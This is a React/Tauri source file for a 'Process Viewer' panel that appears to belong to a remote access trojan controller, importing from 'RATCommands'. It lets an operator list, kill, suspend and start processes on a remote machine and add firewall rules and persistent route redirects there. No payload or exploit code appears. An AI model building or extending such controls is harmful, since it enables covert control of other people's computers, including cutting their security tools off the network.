import { useEffect, useState } from "react";
import { ProcessType, NetworkConnection } from "../../types";
import {
  processListCmd,
  killProcessCmd,
  handleProcessCmd,
  startProcessCmd,
} from "../rat/RATCommands";
import { listen } from "@tauri-apps/api/event";
import { useParams } from "react-router-dom";
import {
  IconRefresh,
  IconProgressX,
  IconCpu,
  IconSearch,
  IconInfoCircle,
  IconPlayerPause,
  IconPlayerPlay,
  IconTerminal2,
  IconNetwork,
  IconShield,
  IconRoute,
  IconChevronDown,
  IconChevronRight,
  IconX,
} from "@tabler/icons-react";
import { invoke } from "@tauri-apps/api/core";

interface ProcessWithConnections extends ProcessType {
  expanded?: boolean;
  connectionsLoading?: boolean;
}

export const ProcessViewer: React.FC = () => {
  const { addr } = useParams();
  const [processes, setProcesses] = useState<ProcessWithConnections[] | null>(null);
  const [processFilter, setProcessFilter] = useState("");
  const [loading, setLoading] = useState(false);
  const [startProcessName, setStartProcessName] = useState("notepad.exe");
  const [actionLoading, setActionLoading] = useState<{
    [key: string]: boolean;
  }>({});
  
  // Firewall dialog state
  const [showFirewallDialog, setShowFirewallDialog] = useState(false);
  const [firewallProcess, setFirewallProcess] = useState<ProcessType | null>(null);
  const [firewallAction, setFirewallAction] = useState<"block" | "allow">("block");
  const [firewallDirection, setFirewallDirection] = useState<"inbound" | "outbound" | "both">("both");
  const [firewallIPs, setFirewallIPs] = useState("");
  
  // Route dialog state
  const [showRouteDialog, setShowRouteDialog] = useState(false);
  const [routeProcess, setRouteProcess] = useState<ProcessType | null>(null);
  const [routeTargetIP, setRouteTargetIP] = useState("");
  const [routeRedirectTo, setRouteRedirectTo] = useState("0.0.0.0");
  const [routePermanent, setRoutePermanent] = useState(true);

  const handleKillProcess = async (pid: string, name: string) => {
    try {
      await killProcessCmd(addr, parseInt(pid), name);
      setProcesses((prevProcesses) =>
        prevProcesses
          ? prevProcesses.filter((process) => process.pid !== pid)
          : null
      );
    } catch (error) {
      console.error("Failed to kill process:", error);
    }
  };

  const handleSuspendProcess = async (pid: string, name: string) => {
    setActionLoading({ ...actionLoading, [`suspend-${pid}`]: true });
    try {
      await handleProcessCmd(addr, "suspend", parseInt(pid), name);
    } catch (error) {
      console.error("Failed to suspend process:", error);
    } finally {
      setActionLoading({ ...actionLoading, [`suspend-${pid}`]: false });
    }
  };

  const handleResumeProcess = async (pid: string, name: string) => {
    setActionLoading({ ...actionLoading, [`resume-${pid}`]: true });
    try {
      await handleProcessCmd(addr, "resume", parseInt(pid), name);
    } catch (error) {
      console.error("Failed to resume process:", error);
    } finally {
      setActionLoading({ ...actionLoading, [`resume-${pid}`]: false });
    }
  };

  const handleStartProcess = async () => {
    if (!addr || !startProcessName.trim()) return;
    setActionLoading({ ...actionLoading, start: true });

    try {
      await startProcessCmd(addr, startProcessName);
      fetchProcessList();
    } catch (error) {
      console.error("Failed to start process:", error);
    } finally {
      setActionLoading({ ...actionLoading, start: false });
    }
  };

  const toggleProcessExpansion = async (pid: string) => {
    setProcesses((prev) => {
      if (!prev) return null;
      return prev.map((p) => {
        if (p.pid === pid) {
          const wasExpanded = p.expanded;
          if (!wasExpanded && !p.network_connections) {
            // Load connections
            loadProcessConnections(pid);
          }
          return { ...p, expanded: !wasExpanded };
        }
        return p;
      });
    });
  };

  const loadProcessConnections = async (pid: string) => {
    setProcesses((prev) => {
      if (!prev) return null;
      return prev.map((p) =>
        p.pid === pid ? { ...p, connectionsLoading: true } : p
      );
    });

    try {
      await invoke("get_process_connections", {
        addr,
        pid: parseInt(pid),
      });
    } catch (error) {
      console.error("Failed to load connections:", error);
      setProcesses((prev) => {
        if (!prev) return null;
        return prev.map((p) =>
          p.pid === pid ? { ...p, connectionsLoading: false } : p
        );
      });
    }
  };

  const openFirewallDialog = (process: ProcessType) => {
    setFirewallProcess(process);
    setShowFirewallDialog(true);
  };

  const openRouteDialog = (process: ProcessType) => {
    setRouteProcess(process);
    setShowRouteDialog(true);
  };

  const handleAddFirewallRule = async () => {
    if (!firewallProcess || !addr) return;

    try {
      const ips = firewallIPs.trim() ? firewallIPs.split(',').map(ip => ip.trim()) : undefined;
      
      await invoke("add_firewall_rule", {
        addr,
        processName: firewallProcess.name,
        processPath: null,
        ruleName: `RAT_${firewallProcess.name}_${Date.now()}`,
        direction: firewallDirection,
        action: firewallAction,
        remoteAddresses: ips,
      });

      alert(`Firewall rule added successfully for ${firewallProcess.name}`);
      setShowFirewallDialog(false);
    } catch (error) {
      alert(`Failed to add firewall rule: ${error}`);
    }
  };

  const handleAddRouteRedirect = async () => {
    if (!routeProcess || !addr || !routeTargetIP) return;

    try {
      await invoke("add_route_redirect", {
        addr,
        targetAddress: routeTargetIP,
        redirectTo: routeRedirectTo,
        permanent: routePermanent,
      });

      alert(`Route redirect added: ${routeTargetIP} → ${routeRedirectTo}`);
      setShowRouteDialog(false);
    } catch (error) {
      alert(`Failed to add route redirect: ${error}`);
    }
  };

  useEffect(() => {
    const processListUnlisten = listen("process_list", (event: any) => {
      if (event.payload.addr === addr) {
        const parsedProcesses = event.payload.processes.map(
          (process: { pid: number; name: string; network_connections?: any[] }) => ({
            pid: process.pid.toString(),
            name: process.name,
            network_connections: process.network_connections,
            expanded: false,
          })
        );

        parsedProcesses.sort((a: any, b: any) => {
          return parseInt(a.pid) - parseInt(b.pid);
        });

        setProcesses(parsedProcesses);
        setLoading(false);
      }
    });

    const connectionsUnlisten = listen("process-connections", (event: any) => {
      if (event.payload.addr === addr) {
        const process = event.payload.process;
        const pid = process.pid.toString();
        const connections = process.network_connections || [];
        
        setProcesses((prev) => {
          if (!prev) return null;
          return prev.map((p) =>
            p.pid === pid
              ? { ...p, network_connections: connections, connectionsLoading: false }
              : p
          );
        });
      }
    });
    
    const firewallUnlisten = listen("firewall-rule-result", (event: any) => {
      if (event.payload.addr === addr) {
        const { success, message } = event.payload;
        console.log(success ? 'Firewall rule applied:' : 'Firewall rule failed:', message);
        // Could add toast notifications here
      }
    });
    
    const routeUnlisten = listen("route-redirect-result", (event: any) => {
      if (event.payload.addr === addr) {
        const { success, message } = event.payload;
        console.log(success ? 'Route redirect applied:' : 'Route redirect failed:', message);
        // Could add toast notifications here
      }
    });

    fetchProcessList();

    return () => {
      processListUnlisten.then((fn) => fn());
      connectionsUnlisten.then((fn) => fn());
      firewallUnlisten.then((fn) => fn());
      routeUnlisten.then((fn) => fn());
    };
  }, []);

  async function fetchProcessList() {
    setLoading(true);
    await processListCmd(addr);
  }

  const filteredProcesses = processes
    ? processes.filter((process) =>
        process.name.toLowerCase().includes(processFilter.toLowerCase())
      )
    : [];

  return (
    <div className="p-6 flex flex-1 flex-col overflow-auto w-full bg-primarybg h-screen">
      <div className="flex justify-between items-center mb-6">
        <div className="flex items-center gap-2">
          <IconCpu size={28} className="text-accentx" />
          <h2 className="text-xl font-medium text-white">Process Viewer</h2>
        </div>
      </div>

      <div className="flex flex-wrap justify-between items-center mb-5">
        <div className="flex items-center gap-4">
          <button
            className="px-4 py-2.5 bg-secondarybg text-white hover:bg-white hover:text-black border border-gray-500 hover:border-accentx transition-all duration-200 rounded-lg flex items-center gap-2 cursor-pointer"
            onClick={fetchProcessList}
            disabled={loading}
          >
            <IconRefresh size={18} className={loading ? "animate-spin" : ""} />
            {loading ? "Refreshing..." : "Refresh Processes"}
          </button>

          <div className="relative w-64">
            <div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
              <IconSearch size={18} className="text-gray-400" />
            </div>
            <input
              value={processFilter}
              onChange={(e) => setProcessFilter(e.target.value)}
              type="text"
              className="pl-10 pr-4 py-2.5 w-full text-sm bg-secondarybg rounded-lg border border-gray-500 focus:border-accentx focus:outline-none focus:ring-1 focus:ring-accentx transition-all"
              placeholder="Filter processes..."
            />
          </div>
        </div>

        <div className="flex items-center">
          <input
            type="text"
            value={startProcessName}
            onChange={(e) => setStartProcessName(e.target.value)}
            className="w-52 py-2.5 px-3 bg-secondarybg text-white border border-gray-500 rounded-l-lg focus:border-accentx focus:outline-none"
            placeholder="Process name (e.g., notepad.exe)"
            onKeyDown={(e) => {
              if (e.key === "Enter") {
                handleStartProcess();
              }
            }}
          />
          <button
            onClick={handleStartProcess}
            disabled={!startProcessName.trim() || actionLoading["start"]}
            className={`px-4 py-2.5 rounded-r-lg flex items-center gap-2 border border-l-0 ${
              !startProcessName.trim() || actionLoading["start"]
                ? "bg-gray-700 text-gray-400 border-white cursor-not-allowed"
                : "bg-accentx text-white hover:text-black hover:bg-white border-accentx cursor-pointer"
            }`}
          >
            {actionLoading["start"] ? (
              <IconRefresh size={18} className="animate-spin" />
            ) : (
              <IconTerminal2 size={18} />
            )}
            Start
          </button>
        </div>
      </div>

      <div className="bg-secondarybg rounded-xl border border-accentx overflow-hidden flex-1">
        <div className="overflow-auto h-full">
          <table className="w-full text-sm text-left">
            <thead className="bg-primarybg text-gray-300 text-xs uppercase sticky top-0">
              <tr>
                <th className="px-4 py-3 w-12"></th>
                <th className="px-6 py-3 w-24">PID</th>
                <th className="px-6 py-3">Process Name</th>
                <th className="px-6 py-3 text-right w-96">Actions</th>
              </tr>
            </thead>
            <tbody>
              {filteredProcesses.length > 0 ? (
                filteredProcesses.map((process, index) => (
                  <>
                    <tr
                      key={index}
                      className="border-b border-accentx hover:bg-accentx"
                    >
                      <td className="px-4 py-3">
                        <button
                          onClick={() => toggleProcessExpansion(process.pid)}
                          className="text-gray-400 hover:text-white"
                        >
                          {process.expanded ? (
                            <IconChevronDown size={16} />
                          ) : (
                            <IconChevronRight size={16} />
                          )}
                        </button>
                      </td>
                      <td className="px-6 py-3 font-mono">{process.pid}</td>
                      <td className="px-6 py-3">{process.name}</td>
                      <td className="px-6 py-3 text-right">
                        <div className="flex items-center justify-end gap-1">
                          <button
                            className="cursor-pointer px-2 py-1.5 bg-blue-700 text-white hover:bg-blue-600 rounded flex items-center gap-1 text-xs font-medium transition-colors"
                            onClick={() => openFirewallDialog(process)}
                            title="Add to Firewall"
                          >
                            <IconShield size={14} />
                            Firewall
                          </button>
                          <button
                            className="cursor-pointer px-2 py-1.5 bg-purple-700 text-white hover:bg-purple-600 rounded flex items-center gap-1 text-xs font-medium transition-colors"
                            onClick={() => openRouteDialog(process)}
                            title="Route Redirect"
                          >
                            <IconRoute size={14} />
                            Route
                          </button>
                          <button
                            className="cursor-pointer px-2 py-1.5 bg-amber-700 text-white hover:bg-amber-600 rounded flex items-center gap-1 text-xs font-medium transition-colors"
                            onClick={() =>
                              handleSuspendProcess(process.pid, process.name)
                            }
                            disabled={actionLoading[`suspend-${process.pid}`]}
                          >
                            {actionLoading[`suspend-${process.pid}`] ? (
                              <IconRefresh size={14} className="animate-spin" />
                            ) : (
                              <IconPlayerPause size={14} />
                            )}
                            Suspend
                          </button>
                          <button
                            className="cursor-pointer px-2 py-1.5 bg-green-700 text-white hover:bg-green-600 rounded flex items-center gap-1 text-xs font-medium transition-colors"
                            onClick={() =>
                              handleResumeProcess(process.pid, process.name)
                            }
                            disabled={actionLoading[`resume-${process.pid}`]}
                          >
                            {actionLoading[`resume-${process.pid}`] ? (
                              <IconRefresh size={14} className="animate-spin" />
                            ) : (
                              <IconPlayerPlay size={14} />
                            )}
                            Resume
                          </button>
                          <button
                            className="cursor-pointer px-2 py-1.5 bg-red-900 text-white hover:bg-red-700 rounded flex items-center gap-1 text-xs font-medium transition-colors"
                            onClick={() =>
                              handleKillProcess(process.pid, process.name)
                            }
                          >
                            <IconProgressX size={14} />
                            Kill
                          </button>
                        </div>
                      </td>
                    </tr>
                    {process.expanded && (
                      <tr className="bg-[#1a1a1a]">
                        <td colSpan={4} className="px-12 py-4">
                          <div className="flex items-start gap-2 mb-2">
                            <IconNetwork size={16} className="text-accentx mt-1" />
                            <h4 className="text-sm font-semibold text-white">
                              Network Connections
                            </h4>
                          </div>
                          {process.connectionsLoading ? (
                            <div className="flex items-center gap-2 text-gray-400 text-sm">
                              <IconRefresh size={16} className="animate-spin" />
                              Loading connections...
                            </div>
                          ) : process.network_connections &&
                            process.network_connections.length > 0 ? (
                            <div className="max-h-60 overflow-auto">
                              <table className="w-full text-xs">
                                <thead className="text-gray-400">
                                  <tr>
                                    <th className="px-2 py-1 text-left">Protocol</th>
                                    <th className="px-2 py-1 text-left">Local Address</th>
                                    <th className="px-2 py-1 text-left">Remote Address</th>
                                    <th className="px-2 py-1 text-left">State</th>
                                  </tr>
                                </thead>
                                <tbody>
                                  {process.network_connections.map((conn, idx) => (
                                    <tr key={idx} className="border-b border-gray-700">
                                      <td className="px-2 py-1 text-gray-300">
                                        {conn.protocol}
                                      </td>
                                      <td className="px-2 py-1 font-mono text-gray-300">
                                        {conn.local_address}:{conn.local_port}
                                      </td>
                                      <td className="px-2 py-1 font-mono text-gray-300">
                                        {conn.remote_address}:{conn.remote_port}
                                      </td>
                                      <td className="px-2 py-1 text-gray-300">
                                        {conn.state}
                                      </td>
                                    </tr>
                                  ))}
                                </tbody>
                              </table>
                            </div>
                          ) : (
                            <p className="text-sm text-gray-400">
                              No active network connections
                            </p>
                          )}
                        </td>
                      </tr>
                    )}
                  </>
                ))
              ) : (
                <tr>
                  <td colSpan={4} className="px-6 py-12 text-center">
                    {processes === null ? (
                      <div className="flex flex-col items-center justify-center text-gray-400">
                        <IconRefresh size={24} className="animate-spin mb-2" />
                        <p>Loading processes...</p>
                      </div>
                    ) : processFilter ? (
                      <div className="flex flex-col items-center justify-center text-gray-400">
                        <IconSearch size={24} className="mb-2" />
                        <p>No processes match your filter</p>
                      </div>
                    ) : (
                      <div className="flex flex-col items-center justify-center text-gray-400">
                        <IconInfoCircle size={24} className="mb-2" />
                        <p>No processes found</p>
                      </div>
                    )}
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>

      {processes && filteredProcesses.length > 0 && (
        <div className="mt-3 text-xs text-gray-400">
          Showing {filteredProcesses.length} of {processes.length} processes
        </div>
      )}

      {/* Firewall Dialog */}
      {showFirewallDialog && firewallProcess && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-[#252525] rounded-lg p-6 w-[500px]">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-xl font-bold text-white flex items-center gap-2">
                <IconShield size={24} className="text-accentx" />
                Firewall Rule: {firewallProcess.name}
              </h3>
              <button
                onClick={() => setShowFirewallDialog(false)}
                className="text-gray-400 hover:text-white"
              >
                <IconX size={20} />
              </button>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-white mb-1">
                  Action
                </label>
                <select
                  value={firewallAction}
                  onChange={(e) => setFirewallAction(e.target.value as "block" | "allow")}
                  className="w-full px-3 py-2 bg-[#1a1a1a] text-white rounded border border-gray-600"
                >
                  <option value="block">Block</option>
                  <option value="allow">Allow</option>
                </select>
              </div>

              <div>
                <label className="block text-sm font-medium text-white mb-1">
                  Direction
                </label>
                <select
                  value={firewallDirection}
                  onChange={(e) =>
                    setFirewallDirection(e.target.value as "inbound" | "outbound" | "both")
                  }
                  className="w-full px-3 py-2 bg-[#1a1a1a] text-white rounded border border-gray-600"
                >
                  <option value="inbound">Inbound</option>
                  <option value="outbound">Outbound</option>
                  <option value="both">Both</option>
                </select>
              </div>

              <div>
                <label className="block text-sm font-medium text-white mb-1">
                  Specific IPs (optional, comma-separated)
                </label>
                <input
                  type="text"
                  value={firewallIPs}
                  onChange={(e) => setFirewallIPs(e.target.value)}
                  className="w-full px-3 py-2 bg-[#1a1a1a] text-white rounded border border-gray-600"
                  placeholder="192.168.1.1, 10.0.0.1"
                />
                <p className="text-xs text-gray-400 mt-1">
                  Leave empty to apply to all addresses
                </p>
              </div>
            </div>

            <div className="flex gap-2 mt-6">
              <button
                onClick={handleAddFirewallRule}
                className="flex-1 px-4 py-2 bg-accentx text-white hover:bg-white hover:text-black rounded transition-colors"
              >
                Add Rule
              </button>
              <button
                onClick={() => setShowFirewallDialog(false)}
                className="flex-1 px-4 py-2 bg-gray-600 text-white hover:bg-gray-700 rounded"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Route Dialog */}
      {showRouteDialog && routeProcess && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-[#252525] rounded-lg p-6 w-[500px]">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-xl font-bold text-white flex items-center gap-2">
                <IconRoute size={24} className="text-accentx" />
                Route Redirect: {routeProcess.name}
              </h3>
              <button
                onClick={() => setShowRouteDialog(false)}
                className="text-gray-400 hover:text-white"
              >
                <IconX size={20} />
              </button>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-white mb-1">
                  Target IP Address *
                </label>
                <input
                  type="text"
                  value={routeTargetIP}
                  onChange={(e) => setRouteTargetIP(e.target.value)}
                  className="w-full px-3 py-2 bg-[#1a1a1a] text-white rounded border border-gray-600"
                  placeholder="192.168.1.100"
                />
                <p className="text-xs text-gray-400 mt-1">
                  The IP address to redirect
                </p>
              </div>

              <div>
                <label className="block text-sm font-medium text-white mb-1">
                  Redirect To
                </label>
                <input
                  type="text"
                  value={routeRedirectTo}
                  onChange={(e) => setRouteRedirectTo(e.target.value)}
                  className="w-full px-3 py-2 bg-[#1a1a1a] text-white rounded border border-gray-600"
                  placeholder="0.0.0.0"
                />
                <p className="text-xs text-gray-400 mt-1">
                  Invalid address to block connection (0.0.0.0 or 127.0.0.1)
                </p>
              </div>

              <div className="flex items-center">
                <input
                  type="checkbox"
                  id="route-permanent"
                  checked={routePermanent}
                  onChange={(e) => setRoutePermanent(e.target.checked)}
                  className="mr-2"
                />
                <label htmlFor="route-permanent" className="text-sm text-white">
                  Make permanent (persist across reboots)
                </label>
              </div>
            </div>

            <div className="flex gap-2 mt-6">
              <button
                onClick={handleAddRouteRedirect}
                disabled={!routeTargetIP}
                className={`flex-1 px-4 py-2 rounded transition-colors ${
                  routeTargetIP
                    ? "bg-accentx text-white hover:bg-white hover:text-black"
                    : "bg-gray-700 text-gray-400 cursor-not-allowed"
                }`}
              >
                Add Route
              </button>
              <button
                onClick={() => setShowRouteDialog(false)}
                className="flex-1 px-4 py-2 bg-gray-600 text-white hover:bg-gray-700 rounded"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
